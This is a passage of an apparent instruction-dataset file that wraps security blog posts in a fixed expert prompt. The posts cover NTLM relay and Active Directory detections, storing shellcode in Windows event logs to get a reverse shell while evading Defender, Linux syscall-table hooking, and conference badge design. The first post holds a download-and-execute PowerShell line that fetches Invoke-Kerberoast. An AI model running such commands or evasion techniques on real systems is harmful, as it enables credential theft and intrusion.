objShell.CreateShortcut c file6 malicious.lnk PS C lnk.TargetPath 10.0.0.8 threat.png Thus if there is a training target here it is all of IT operations on the nature of these files Repeating browsing a file share with the above LNK file will trigger silent Windows domain credential submission to the attacker password hash If a DA browses this share the DA creds are submitted to the attacker's relay An end user browses the share their domain credential material is sent to the attacker There is nothing to teach the end user here unless I am missing something Detect You could just detect and alarm on the file creation event using Sysmon It really is just as easy as creating a match against .URL and .LNK files BOOM easy win oh yeah this gets caught by default using the legendary Olaf's Sysmon-Modular .2 No Sysmon Check your EDR and its capabilities Windows event ID 4656 could drown your organization in log volume so from an advice perspective it would be difficult to enable Audit Object Access efficiently Defense This was made simple by Microsoft with FSRM This allows a share administrator to limit the file extensions allowed That simple Yeah You should try it sometime it works You can make this even easier by narrowing the focus of your file shares If your domain lacks a cohesive workstation firewall policy you probably have file shares you do not know about Workstation firewalls will reduce the open share footprint on your network reduce openings for adversaries using SMB RPC3 to facilitate additional attacks and is another better security practice that can reduce risk One more thing know your egress exposure and check it often You should reduce your outbound port exposures to avoid hashes getting shipped to an adversary outside your networks The next defense scenario attempts to mitigate Mitre ATT CK T1557 Adversary in the Middle ttack.mitre.org techniques T1557 001 From the LNK attack perspective the adversary in the middle is parked somewhere on your network or domain as a relay When an end user browses the LNK'd share their creds are sent to the adversary in the middle AiTM who forwards the creds along to whatever target makes sense in context LLMNR and NBNS poisoning is a different animal and has been described in such exhausting detail over the years4 that it is shocking these protocols have not been patched out by Microsoft maybe they have Anyway the Windows computer fails to identify a valid name to IP map and chooses to spew broadcast and multicast traffic all over the subnet Our AiTM hears responds receives creds profits This next defense technique is intended to match against an older version of the Mitre ATT CK technique T1136 Add a Domain Account ttack.mitre.org techniques T1136 002 Mitigations These are basically moot when going up against NTLM relay via malicious URL LNK or LLMNR The adversary is already in the post-exploitation phase of this attack MFA Not likely going to help against an LDAP DCE RPC5 attack Network segmentation Are you planning to allow end users and computers to authenticate against the domain I thought so thus you cannot segment off LDAP...strange mitigation Patch your DCs obvs but LDAPs and channel binding is what you really want here Finally PAM Yay Yeah do this too Keep your domain admins from interacting with anything except the domain controller and only under controlled conditions Detections Both command and PowerShell transcription are required these days You will not survive a pentest without knowing what is going on across your infrastructure's terminals Catch net commands Catch IEX invoke bypass github and a bunch of other dangerous terms that you might see in CLI log events Windows event ID 47206 and 4722 should be monitored closely These will describe account creation events Defense Check your ms-ds-machine-account-quota attribute in Active Directory If this value is at default it means that any domain user can add up to 10 computers to the domain This value should be zero and the activity should be controlled by appropriately delegated systems administrators GetADUsers.py Domain enumeration is common enough adversarial activity IT operations pentests that having a decoy account to notify the team is worth the time to deploy alert and monitor Better to know someone ran SharpHound ADExplorer or GetADUsers.py than exist in the blind state way too many organizations are operating under So this defense technique could be referenced in MITRE ATT CK as T1087 Account Discovery Domain Account This is basic enumeration in the attack technique matrix ttack.mitre.org techniques T1087 002 Let's run the deception tool mentioned earlier and add an account that we will specifically monitor and alert against any time the user's attributes are enumerated iwr -URI ithub.com DefensiveOrigins Deploy-Deception archive refs heads master.zip -outfile deception.zip expand-archive deception.zip rm deception.zip mv deception Deploy-Deception-master deception cd deception Set-ExecutionPolicy bypass -Force Import-Module Deploy-Deception.ps1 Create-DecoyUser -UserFirstName DOLabs -UserLastName AnyRead -Password Password1 Deploy-UserDeception -UserFlag PasswordNeverExpires Verbose The next piece of this detect and alert puzzle requires that we gather the ObjectGUID from the object's AD attributes Get-ADUser -Identity DOLabsAnyRead -Properties ObjectGuid Once you have the GUID build your detection logic where the Windows event ID is 4662 and the GUID we gathered from our decoy Run BloodHound ADExplorer GetADUsers whatever enumeration tool fuels your engine In Sentinel I get a detection Get-GPPPassword.py This attack maps against MITRE ATT CK a sub-technique under T1552 Unsecured Credentials Group Policy Preferences ttack.mitre.org techniques T1552 006 The recommended mitigations here align with reality Defense Detection You should catch this activity if it is performed via CLI or PS If any terms in your transcription logs align with cpassword file an incident and get investigating GetUserSPNs.py The GetUserSPNs.py class was designed to gather Kerberos ticket hashes from a domain This attack is classified as a sub-technique of MITRE ATT CK T1558 Steal or Forge Kerberos Tickets ttack.mitre.org techniques T1558 003 This one is great Let's add an SPN to Luis account which we created earlier and use that account to detect kerberoasting setspn -a ws05 luis.graves.doazlab.com 1433 doazlab.com luis.graves Roast 'em IEX New-Object Net.WebClient .DownloadString 'aw.githubusercontent.com EmpireProject Empire master data module_source credentials Invoke-Kerberoast.ps1 Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat john The ticket byte hex stream was chopped for brevity We did catch this activity This is an IoC This was an easy win Create and alert on this type of activity Defense Seriously strong passwords I am not talking about long organization-related scrapable or dictionary type passwords I am talking 25 characters or more multiple words or randomized and PAM managed passwords Managed service accounts Standalone MSAs are easy to deploy Group MSAs gMSAs are a bit more challenging but are designed for clustered systems like database servers Secretsdump.py This attack aligns with MITRE ATT CK T1003 OS Credential Dumping ttack.mitre.org techniques T1003 003 Mitigations These mitigation IDs are great advice Read the section on MITRE Detections What about the RemoteRegistry service Most of the tools that interact with LSA and attempt to capture the SAM table use an SMB remote process procedure call to start this service Once the service is started additional operations are performed using it I almost forgot to include this detection thus the old screenshot below However you should treat Windows event ID 4688 with invocations to start the RemoteRegistry service as worthy of investigation The second Secretsdump.py invocation is the NTDS.dit capture This has the same parent technique T1003 OS Credential Dumping but is a different sub-technique In this case the MITRE sub-technique is listed as DCSync ttack.mitre.org techniques T1003 006 Detections All DCsync operations performed by a non-DC should be scrutinized like the organization's intellectual property depended on it This should raise flags across IT operations All hands on deck Defenses Secretsdump can be limited with workstation and server firewalls Often the intermediate jump to DA has 445 open which allows SMB RPC access to LSASS This access allows the compromise of an admin and may open additional paths across a network Thanks for reading -jd References 1 ocs.microsoft.com en-us windows-server storage fsrm fsrm-overview 2 ithub.com olafhartong sysmon-modular 3 ww.thehacker.recipes ad recon ms-rpc 4 ww.blackhillsinfosec.com how-to-disable-llmnr-why-you-want-to 5 dapwiki.com wiki DCE-RPC 6 ww.ultimatewindowssecurity.com securitylog encyclopedia event.aspx?eventID 4720"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Windows Event Logs for Red Teams</title>\n<taxonomies>Author, How-To, Red Team, Red Team Tools, Tim Fowler, Event Logs, Fileless, Injection, Logging, Payloads, shellcode</taxonomies>\n<creation_date>Mon, 08 Aug 2022 15:17:06 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Tim Fowler Do you know what could be lurking in your Windows event logs In May of 2022 I was sent a Threat Post article about a new technique that had been discovered in the wild for maintaining persistence using Windows event logs I immediately started skimming the article which can be found here hreatpost.com attackers-use-event-logs-to-hide-fileless-malware 179484 and the original Kaspersky report here ecurelist.com a-new-secret-stash-for-fileless-malware 106393 I found myself both surprised and frustrated at how simple it was to leverage Windows event logs for storing offensive payloads that could in turn be used to maintain persistence At the time the article was published I was in San Diego for WWHF Way West 2022 so I planned to take a deeper dive into the subject once I returned home Fast-forward a few weeks I finally had some time that I could circle back to the article and really dive in and try to figure out what was going on how it all worked and what if any were the limitations of using Windows event logs as a payload storage apparatus For me the most logical place to start getting a better understanding of how it worked was understanding some important details basics really about how event logs work within Windows I won't bore you with a lot of mundane details but it is important to understand some of the basics especially around the creation of event logs and how it impacts using the logs for offensive purposes Windows Event Log Basics The Windows event log contains logs from the operating systems services and applications such as Office and SQL Server The logs use a structured data format that make them easy to search and analyze The easiest means of accessing the Windows event log is to use Event Viewer evetvwr.exe The primary logs for Windows systems are in the Windows Log and within that folder are five categories that are standard on all Windows systems Application Security Setup System Forwarded Events There is also a collection of logs in a folder within Event Viewer called Application and Services Logs that contains logs of individual applications and hardware-based events Windows PowerShell logs would be found in this collection Each log entry is formatted with specific fields that allow for a common structure The following fields are some of the most filtered fields for log analysis Log Key e.g Application Source e.g Outlook Date Time EventID Task Category Application defined Level Computer EventData Message and Binary Data Windows Event Log User Constraints Are you a local admin Just a regular user Certain event logs can only be written to if you're a local administrator others are writeable by everyone While not super important for this blog post depending on the use of the technique later in this post these constraints on users not being able to write to certain logs could come into play Shown below is a nice chart of the permission users have regarding the various event logs found on a common Windows installation If it is not already obvious let me state it for the record that to be able store a payload in an event log entry you must first be able to write to the event log Depending on your user context you may not be able to write to some logs such as the System log unless you are operating in the context of a local administrator Windows Event Log Size Constraints One other constraint to be aware of is that there is a size limitation on the amount of data that can be stored in an event log based on the maximum character limitation of the Event message string of 31 839 characters Now that all the basics are covered Oh wait one more thing Not only is it possible to create arbitrary event log entries if you are a local administrator you can also create entirely new event logs Hold on to this as we will come back to it Now the basics are done and we can jump in and start creating some event log entries Using PowerShell and the Write-EventLog commandlet it is simple to create arbitrary event entries with the following command Write-Event -LogName 1 -Source 2 -EventID 3 -EventType Information -Category 0 -Message 4 There are a few things to be aware of though First the -LogName argument must be a valid log for which your user context can write to and secondly the -Source argument needs to be a source that is registered as a source to the specific log in the Windows registry In the registry you will find the EventLog Logs located at Computer HKEY_LOCAL_MACHINE SYSTEM CurrentControlSet Services EventLog and within each of those keys you will find a list of sources that have been registered to that event log As shown above we chose to use the event log Application and the source Edge since Edge was valid source registered to the event log For the purpose of demonstration we chose an arbitrary EventID of 31337 but you can use any EventID of your choosing But as shown shortly choosing a valid EventID can help limit the indicators that something is mucking about in the log When creating an event log entry you will need to define the EntryType using the -EntryType argument There are five types that can be used but if you are trying to not get caught the information type is probably the best option Next to last there is the Category which is an application defined field used to aid in filtering logs Here we set it to 0 which equates to None when viewed in Event Viewer Looking in Event Viewer we can see that our event log entry was successfully created in the Application log with the Event ID of 31337 and the message Here be dragons One thing to note is that if you used the previous command to create a log entry for yourself you would see the following text in the log message before our user-supplied message of Here be dragons The description for Event ID 31337 from source edge cannot be found Either the component that raises this event is not installed on your local computer or the installation is corrupted You can install or repair the component on the local computer If the event originated on another computer the display information had to be saved with the event The reason this message is prepended to our user-supplied message is that in the registry key for the source Edge there is an attribute called EventMessageFile that points to a DLL file that contains the event messages associated with the source In our case we provided an event ID that was not found in the EventMessageFile and thus resulted in the message we saw for our log entry in Event Viewer If you are trying to stay under the radar and undetected it is advised that you only use sources and subsequent event IDs that are related It is not common for an event source to generate this sort of message in normal day-to-day event log entries so messaging could raise suspicion if the event is observed by an analyst Having shown that it is trivial to create event log entries the next step is to figure out how and where to inject a payload If you remember back to the Windows Event Log Basics the EventData field of an entry supports both a message and binary data By simply adding one more argument to our PowerShell command we can include binary data in the event log entry by using the -RawData argument To be able to embed binary data in our log entry we must pass it to the Write-EventLog commandlet as a byte array There are many methods that one could use to do this but I chose to convert a hex literal string containing my data into a byte array then passed that variable to the -RawData argument Pulling up the new log entry and clicking on the Details tab we find that the binary data we included is stored nicely for us to see in byte form as well as the ASCII version of the data Bam We now have user-defined binary data stored in a log entry I think you can see where this is headed The logical next step is to include an actual payload in a log entry and not just some text To start I generated a simple Windows exec payload using msfvenom using the output format as hex literal string Next we must create a new event log entry with the payload string from above To replicate the actions of the threat actor using this technique instead of using the Application log and source of Edge we used the Key Management Service log and the source KmsRequests as shown in the image below taken from Kapersky's SecureList article edia.kasperskycontenthub.com wp-content uploads sites 43 2022 04 28153130 SilentBreak_APT_toolset_01.png Looking back in the Event Viewer we can see that our log entry was created and our binary payload is stored safely inside This is awesome but we have an issue we have a stored payload but no way to use it yet Payload retrieval time There are probably about 14 598 231 ways to approach pulling the payload from the event log entry we created but given that we need to also execute the payload I opted to use a simple C program that would search for long entries with the eventId of 31337 in the Key Management Service log and then pull the binary data from said entry The following code is a very basic and grossly written proof-of-concept that pulls the binary payload data from the first entry in the event log Key Management Services then executes that binary payload using a very common shellcode injection technique that will inject the payload into the current running process The code used for this proof-of-concept can be found on GitHub here EventLogForRedTeams After compiling the PoC code with Visual Studio we can execute the program popping calc.exe from a stored binary payload in an event log The astute among us will notice that the code did throw a supposedly fatal error but it did not prevent the successful execution of calc.exe Remember this code was designed to barely function as a PoC so the fact that there was only one fatal error is a win in my book Well there it is binary payloads stored in Windows event logs wait what You want more I figured as much so buckle up and here we go Popping calc.exe is all well and good but we can do much more than that leveraging this technique How about a remote shell Metasploit you say In 2022 surely not Let's try it First we need to generate a new payload using msfvenom I opted to use the payload windows x64 shell_reverse_tcp for this mostly because I feel like any Metasploit payload is a crapshoot in 2022 but I have found that stageless payloads have a higher chance of success but your mileage may vary After creating the hash literal string of our new payload I had to create a new event log entry using the new payload Due to the simplistic approach the C code takes to find the payload in the event logs it will only pull binary data from the first entry found in the log so I cleared the Key Management Service log before moving on With the log cleared of entries I could create my new log entry with the updated binary payload As shown in the image below our payload was once again safely stored in the event log entry just waiting for something to use it The last step was to setup an nc listener using -nvlp 1337 as arguments With our listener setup it was time to execute our program to inject our shellcode and hopefully get a remote connection To facilitate this I SSH'd into a Kali Linux virtual machine from the Windows virtual machine to run the listener As shown in the image above a session was successfully established on the Windows 11 Pro host with Windows Defender running and no settings turned off Victory Well almost You see when I started this research effort everything just basically worked as expected Windows Defender was completely blind to most Metasploit payloads and it was a lot of fun Then something changed and Defender started to catch the injected payloads after a session had been established and then eating the payload injector None of this is surprising especially since there are zero obfuscation efforts going on to hide what payloads are being used and how they are being used Just vanilla out-of-the-box Metasploit in 2022 However it just goes to show that there is great potential in using the log entry injection technique for storing payloads In fact a few moments after the previous screenshot was taken Defender rose its head and gobbled up our injector killing our session Like most things in life if you put a little effort into and try to understand what is going on around you amazing things can happen like a Cobalt Strike Beacon running on a fully patched Windows 11 Pro System with zero obfuscation Hint HTTPS Beacons work better right now So I ask again what is lurking in your Windows event logs Shellcode Possibly If not today maybe tomorrow As I have shown it is trivial to inject a malicious payload into an event log entry and retrieve it later for execution While this post did not touch on anything beyond the basics I am sure if you made it to this point you already have ideas of how this could be leveraged for establishing persistence and more If you would like to play around with this technique more specifically as a persistence method I would suggest you check out a tool from Improsec on Github found here SharpEventPersist that allows you to establish persistence using event log injection with Cobalt Strike's execute-assembly"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Linux System Call Monitoring</title>\n<taxonomies>Informational, C, Linux, Linux Kernel</taxonomies>\n<creation_date>Tue, 13 Sep 2022 16:37:36 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "moth I've been diving deep into Linux lately with my latest kick being exploring the Linux kernel I've found The Linux Programming Interface TLPI by Michael Kerrisk among others to be a fantastic reference manual that covers the application of system calls syscalls For a quick primer on Linux syscalls check out the introductory Linux manual page on the subject by using the man 2 intro command in a terminal or viewing the page online While reading through TLPI I found myself yearning for a deeper exploration into the implementations of the syscalls themselves To that end I've lately been reading a lot of kernel source code and chaining bits of code together to get a better understanding of what some things do My first port of call was a way to detect when a given syscall was used and a way to see what information was passed to it before it was executed As an extension of the overarching adventure I ultimately wanted to have a Loadable Kernel Module LKM that would listen for a given syscall and at the very least log that the syscall was observed Ideally the module would also print some detailed information about the call's arguments What I've ended up with is a piece of code that I can extend to monitor arbitrary syscalls as well as a mechanism to investigate Linux kernel security Kprobes Some initial research led me to a kernel tracing facility called Kprobes which can be used to hook most kernel symbols From what I understand registering a kprobe in the kernel causes it to be inserted immediately before the target symbol in memory saving the symbol's information in the process The registered kprobe then executes any code written in kp pre_handler runs the instruction then executes whatever you may have written in an optional kp post_handler I think the Kprobes facility is wicked cool and I will certainly return to it at some point but it wasn't immediately useful or so I thought in giving me a look into when specific syscalls are used and my initial probing resulted in mostly garbage in the log Kallsyms More research eventually led me to kallsyms which is a facility used to extract kernel symbols I found a snippet of code that seemed to do exactly what I needed Using the kallsyms_lookup_name function the kernel module looks up the address of the system call table By using the address of the table you can temporarily replace the syscall's definition after enabling read write access to the table courtesy of an answer on Stack Overflow with your own definition which in my case just includes a printk to write to the log file when the call is used I know that I've only scratched the surface of what can be done with this facility but a deeper investigation can and hopefully will happen some other time So I compiled the module and tried loading it It compiled successfully good sign but trying to load the module gave me a strange error bad sign ERROR modpost kallsyms_lookup_name home moth watcher.ko undefined Cool No clue why kallsyms_lookup_name is undefined but I'll have to look into that After some additional research I happened upon an answer It turns out that since kernel version 5.7.0 the kernel no longer exports that symbol globally With that knowledge I now have to find an alternative solution Kprobes Redux I found an issue on a kernel hacking GitHub repository discussing the same thing I was running into and the folks in the thread hashed out something truly glorious Remember kprobes and how they weren't immediately useful for this project Just kidding turns out that facility is incredibly useful just not in a way I had initially expected One of the things you get back in a kprobe structure is the address which is where the probe lives in memory Maybe you can already see where this is going We can use a kprobe to retrieve the address of the kallsyms_lookup_name function because kprobes can see basically any kernel structure We can then treat the address of that kprobe as the function itself circumventing the need for the kernel to expose it to us at all All Together Now That should be everything needed to make a working proof of concept Baking the bits of code I found into the module it can now be used to read write the syscall table and insert a handler into whatever syscall I want to look at For now I've been targeting getuid as it's relatively simple In one terminal window I insert the module with insmod run the id command which relies on the getuid syscall and then remove the module with rmmod Loading Module Running ID Command Removing Module Pretty straightforward so far In another terminal where I have dmesg -wH running I see the module setup info including the addresses of kallsyms_lookup_name sys_call_table and the getuid syscall The module then sees three getuid calls before quieting down A handful of seconds later I run the id command and the syscall is identified and logged Another handful of seconds after that I run rmmod which results in the remainder of the intercepted syscalls Successful Syscall Observation I wasn't immediately sure where the other getuid calls were coming from but I eventually realized that it was most likely due to my use of the sudo command to insert or remove the module This seems to work incredibly well and I have ideas for extending it into something more useful for other potential projects Also the dmesg output isn't very useful on its own right now so the next step will be to output register values and any other relevant information I can think of Conclusion and Code There's an important caveat I need to make here The Kprobes facility is a feature which can optionally be disabled In case it's not enabled and you are feeling adventurous you can compile the kernel with the options specified in the Kprobes documentation to make sure you can load modules to play with the facility Red Hat flavors seem to have the requisite features enabled by default Your mileage may vary depending on Debian or any other flavors Overall this has been a fun exercise and an excellent learning experience Is it the most useful thing in the world No Are there other more robust solutions available Almost certainly I think SystemTap would fit the bill nicely That said understanding how to hook into the kernel as well as everything else learned throughout this project will be invaluable as I work on other projects going forward Speaking of other projects going forward what's next Beyond my original goal of deepening my understanding of Linux system calls I've now found a way to overwrite system calls as well as other kernel structures with seemingly anything I want Beyond simple monitoring how might I be able to extend and inevitably break syscall functionality Further still beyond the syscall table what other sorts of kernel structures and memory can I overwrite And crucially what will this do to my poor computer I didn't expect an evening of tinkering to result in any of this but I'm excited to see what I can come up with Alright enough of the human words It's time for some computer words You can find the module code here if you're interested Please note the links listed in the comments as I wouldn't have gotten this far if I hadn't found them"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>So You Want to Build a Conference Hardware Badge!</title>\n<taxonomies>Author, Fun & Games, How-To, Informational, Ray Felch</taxonomies>\n<creation_date>Thu, 15 Sep 2022 17:05:02 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ray Felch 2022 BHIS CyMon badge Recently it was suggested that it would be cool to create a hardware badge for one of the upcoming InfoSec conferences Admittedly I have a pretty solid background in electronic circuit design and software development however a conference hardware badge was a relatively new concept to me Fortunately for me I have a son that's been working in the Information Security environment for a number of years and is also an avid collector of conference badges After checking out some of the badges in his collection and conducting many Google searches I soon discovered that conference badges can run the gamut from very simple cool blinky-light boards to more elaborate CTF hackable printed circuit boards PCBs Many of these badges can take on some pretty unique shapes and interesting silkscreen images in their designs A few months ago I had the opportunity to connect with Jonathan Singer at the B-Sides conference in Tampa Jonathan took time out from his schedule to talk to me and he provided me with an add-on board to his 2018 Unofficial DEFCON 26 badge which he had designed a few years ago It's reassuring to know that he chose the same PCB fabrication house PCBWay that I had been working with 2018 DEFCON 26 Florida Man badge Outline For this write-up I have decided to use my first attempt at creating a hardware badge as a process walk-through as this proved to be a valuable learning experience I will be highlighting the steps involved in producing the badge from start to finish including sharing some of the obstacles I needed to overcome In the process I will offer some useful tips on electronic circuit design as well as provide some code development tricks and tools and helpful information about using the Arduino Uno as a development board Moreover I'll show the process of how to convert the working electronic breadboard circuit to a PCB using a CAD design system and ultimately build the PCB using one of the many available fabrication manufacturers This write-up will show some of the options available and potential problems you might encounter during this phase of the development Additionally we'll discover some of the options available to us with regard to building a cost-effective finished product This might involve outsourcing the CAD design overseas Pakistan and fabricating assembling the PCB in China PCBWAY PLCPCB etc These options while offering lower prices can introduce long lead-times and can also significantly delay communications between the developer designer and manufacturer should questions arise It wasn't long before I realized just how many moving parts go into creating the badge from start to finish Fun fact I quickly learned that in my time-zone flipping AM to PM or PM to AM and adding an hour gets me the time in China PCBWAY right now Likewise flipping AM to PM or PM to AM and subtracting two hours gets me the time in Pakistan PCB CAD designer right now Electronic Design Phase As one might guess this is my favorite part of the overall process of building a hardware badge Before getting started I needed to come up with a theme for the badge that would be entertaining as well as educational Obviously the 'theme for a conference badge can vary tremendously but with this being my first journey into uncharted waters I decided to keep it relatively simple For my badge I chose to model the Milton Bradley now Hasbro electronic game Simon launched in 1978 This popular game generates a sequence of tones and colored lights which in turn requires the player to repeat the sequence The sequence grows in size as gameplay continues As this hardware badge is targeted for an InfoSec audience I decided to go with the name CyMon as a play on words Software Platform The past couple of years I have been doing a great deal of software hardware development using the Arduino IDE and Arduino Uno development board Other development platforms exist and I also experimented with Platform IO using Microsoft Visual Studio At its core the Arduino Uno development board uses the Atmel ATMega328P microprocessor and is a very cost-effective 16MHz processor providing 14 digital input output pins 6 can be PWM outputs and 6 analog inputs There is also a great deal of Arduino-based information on the web and finding Arduino-based examples of the Simon game was fairly easy to locate The Arduino IDE has a great easy-to-use GUI graphical user interface making it easy to write code and upload to the board The specifics on how to get started using the Arduino IDE are beyond the scope of this write-up but suffice it to say it should be a fairly short learning curve especially with all of the help of the Arduino community forums bloggers and support on the web Getting Started on the Breadboard Now that we have the theme for the CyMon badge we can begin gathering the required components to breadboard the circuit Again learning how to breadboard could be a write-up of its own and this write-up assumes the reader has the basic knowledge of how the breadboard is constructed and how to inter-connect the various components Based upon the concept of gameplay of the Simon game we will need 4 different color LEDs light emitting diodes blue green red and yellow We will also need to limit the current through these LEDs with a 330 ohm resistor so that they don't exceed the LED specs and burn out Additionally we will need 4 momentary normally open switches to capture the user's gameplay selections Typically one side of the switch will be pulled high through a 10k resistor to Vcc 3.3 volts The opposite side of the switch will be tied to ground 0 volts When the button is pressed the switch closes changing the signal from 3.3 volts digital 1 to Ground digital 0 Note In order to reduce key-bounce chatter we will bypass the switches to ground using a 0.1uF ceramic capacitor For the audio tones we'll need a piezo speaker and for communicating with the user we'll be using an I2C OLED display We also will be including 2 more momentary NO switches in addition to the 4 gameplay switches These two switches will be a reset switch for the processor and a new game start over switch and will require the same 10k resistors and 0.1uF bypass capacitors Finally for the microprocessor circuit we will need the ATMega328P 28-pin microprocessor a 16MHz crystal required for high speed external clocking of the microprocessor and 2 22pF bypass capacitors for clock stability as well as a toggle power-on switch The breadboard can be powered using a 3.7 volt rechargeable CR2032 button battery so we'll need a button cell battery holder and a couple of 10uF electrolytic capacitors for the power rails Components 4 LEDs blue green red and yellow 4 330 ohm resistors 6 tactile momentary NO switches 6 10k pullup resistors 1 Piezo speaker 1 OLED display 1 ATMega328P microprocessor 2 22pF ceramic capacitors 1 16MHz crystal oscillator 6 0.1uF ceramic capacitors 1 slider DPST toggle switch 1 button cell battery holder 2 10uF Electrolytic capacitors Looking at the list of components we should note that most are passive components typically unaffected by reverse-polarity or voltage issues etc Of the components listed the microprocessor and OLED display are considered active components Active components can be severely damaged if wired incorrectly or subjected to high voltage levels that exceed the specified ratings of the device Likewise care must be given to the wiring of active components with regard to ensuring Vcc is connected only to the pins marked accordingly Connecting Vcc directly to a GPIO general purpose input output pin can permanently damage the device This will become more relevant later in the write-up when we test our prototype PCBs Note Although resistors capacitors and switches are considered passive components and less susceptible to damage under extreme conditions of high current draw or high voltage levels any component can be damaged if the circuit is improperly designed That being said the circuits described in this write-up are very common configurations that draw very little current and typically operate on 3.3 volts to 5 volts Obviously a damaged component at the breadboard stage is going to have less of an impact on the entire build process than would be the case at the prototype testing stage The former stage simply requires lifting the damaged component from the breadboard and replacing the device whereas the latter stage requires special surface mount device SMD equipment and tools to remove the damaged device Likewise applying power to the latter stage prototype board without first checking proper orientation of active components can be a major headache as we will soon see How to Get Help With Individual Sub-Circuit Component Designs During the breadboard stage when designing the hardware badge overall circuit I found it helpful to do a Google search for ideas on how to implement the various sub-circuits For example we could search Arduino OLED display DIY or Arduino piezo DIY or Arduino momentary switch DIY or Arduino LED DIY etc Not only do these search links provide helpful wiring diagrams and great tutorial videos they typically provide sample sketches code blocks that can be uploaded to the Arduino Uno Development board for testing and debugging your code Once you verify a particular sub-circuit works as you intend it to you can move the component s and its wiring to your main breadboard Wiring the ATMega328P 28-pin Microprocessor Dual Inline Package DIP A huge step in designing your own electronic circuitry is to learn the details of your Development board's microprocessor and incorporate that microprocessor on your breadboard Upon close examination of the Arduino Uno's onboard microprocessor you will notice it uses a 28-pin DIP package ATMega328P device Armed with this knowledge we can now install the ATMega328P processor on our breadboard and harness much of the capability of the Arduino Uno Development board The following diagram shows the pin-by-pin wiring of the ATMega328P and its corresponding handful of components 16MHz crystal 2 22pF capacitors reset momentary switch and 10k resistor Also shown in this diagram is an LED and corresponding 330 ohm current limiting resistor as an example Comparing the two diagrams we can see that the LED is tied to pin 19 of the processor and the mapping diagram indicates that pin-19 corresponds to GPIO-13 digital pin D13 Bonus tidbit Setting GPIO D13 high 3.3v in the code turns the LED on and setting it low turns the LED off Now that we have our breadboard up and running we can bring pin-2 RX and pin-3 TX and GND out to an empty spot on the breadboard These two pins are the serial UART Universal Asynchronous Receiver Transmitter of the processor and when attached to a TTL-USB adapter allows for programming the ATMega328P device much in the same manner that we would program the Arduino Uno As there are many different ways to program the ATMega328P UART using TTL-USB SPI using FTDI-USB USB-ISP USB-ASP etc these programming steps are better suited for a follow-up write-up With a functioning breadboard 'test-bed we can write our Simon game code compile the code and upload the firmware to the processor for thorough testing and debugging Writing the code as well as testing and debugging the code is an ongoing process in itself How much time will be expended is directly related to how far you want to go with it over and beyond what is required to create a functional Simon game In my case I decided that I wanted to make my hardware badge hackable I added some code that using the UART Universal Asynchronous Receiver Transmitter connection I could connect a TTL-USB adapter then use a terminal program like minicom and access a shell into the code to uncover a hidden menu with hidden CTF challenges The UART serial interface allows for two-way communication between the badge and the terminal program For example the terminal program can receive any data that the processor might be sending and display it in its console As you might guess the amount of time you spend on software development is only limited by your imagination and the number of features you want to provide Of course there may be time constraints when targeting your badge for a specific conference Now would be a good time to consider the printed circuit development phase of the process as fabrication lead-times can be 25 to 30 days or more Fortunately for us we can continue writing and tweaking the code during these long delays in the production process CAD Design Phase Computer-aided design is the use of computers to aid in the creation modification analysis or optimization of a design This software is used to increase the productivity of the designer improve the quality of design improve communications through documentation and to create a database for manufacturing Wikipedia There is quite a selection of CAD software available to choose from Many are free many are expensive and many are somewhere in the middle In addition many CAD software systems are geared toward specific applications such as building housing construction and floor-plan layouts 3D modeling printed circuit board design and fabrication etc Of course we're interested in PCB design software and there is an abundance of choices here as well Altium Altium 365 Autodesk Fusion 360 Autodesk EAGLE KiCad EDA Ansys RedHawk EasyEDA etc Back in the mid-80's I experimented with a package known as Orcad which still exists today Last year I downloaded the free version of Autodesk's EAGLE and went to work learning their CAD design software My first project with learning the inner workings of EAGLE was a thru-hole version no surface mount components of the Simon game Although it was a slow process learning EAGLE as I go I successfully created the schematic board layout and routing As is the case with all good CAD software with a click of a button I was then able to generate the Gerber files drill hole file BOM build of materials file and Pick and Place file picking and placing the SMT components These files are required by the PCB fabrication company that will be building and assembling the finished PCB product In the case of my experimental 'learning EAGLE printed circuit board there was no assembly being done at the fabrication house I had opted to go with thru-hole rather than surface mount components for ease of assembly and ordered 5 boards with no component assembly The total cost was only 30 with a fabrication build lead-time of only 4 5 days When I received the boards I soldered the components by hand and soon verified it operated as intended 2021 CyMon Game My experience using the EAGLE software was a rewarding one however it literally took me weeks to complete this fairly simple design One of my biggest obstacles to overcome was learning how to traverse the vast sea of libraries in order to find the correct components for my application I could only imagine how difficult it would have been had I gone with the low-profile surface mount device SMD technology approach Additionally learning the various EAGLE command tools also took considerable time to get through That being said I'm sure with more time invested and as new projects materialize the design process will become easier and completion times will get better This raises an important point worth some consideration When the hardware badge is intended for a specific conference and tight deadlines need to be met I felt that it might be a better option to outsource the CAD design work to a competent professional This was the case on my first conference hardware badge CyMon and the focus of this write-up I was concerned with the amount of time it would take me to get back up to speed using EAGLE as it had been close to a year since I had worked with it Additionally I wanted to go with low-profile surface mount devices on this version and that meant searching through new libraries To complicate things even further we were talking about an order of 800 PCBs which completely ruled out any manual assembly of the components Fortunately a colleague my son recommended that I check out a website called iverr.com where professionals of many different fields offer their services and compete with others for your business In my case I searched for 